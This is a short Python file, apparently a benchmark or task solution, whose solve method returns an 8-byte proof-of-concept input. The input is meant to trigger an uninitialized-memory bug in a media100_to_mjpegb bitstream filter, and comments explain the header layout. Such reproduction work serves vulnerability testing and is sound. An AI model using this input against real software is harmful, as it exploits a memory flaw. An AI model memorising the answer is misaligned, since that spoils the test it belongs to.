import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a use-of-uninitialized-value in the
        # media100_to_mjpegb bitstream filter. The filter does not clear the
        # padding of the output buffer it allocates.
        #
        # The filter expects an input packet where the first 4 bytes represent
        # the total packet size as a big-endian integer. The code requires this
        # size to be at least 8. To create a minimal PoC, we can use a size of 8.
        # This corresponds to an 8-byte header and a 0-byte payload, which is
        # sufficient to trigger the allocation and the subsequent use of the
        # uninitialized padding by a consumer like a muxer.

        total_size = 8

        # The PoC consists of the 8-byte header:
        # - 4 bytes for the size (big-endian).
        # - 4 bytes for the rest of the header, which can be nulls.
        poc = struct.pack('>I', total_size) + b'\x00\x00\x00\x00'
        
        return poc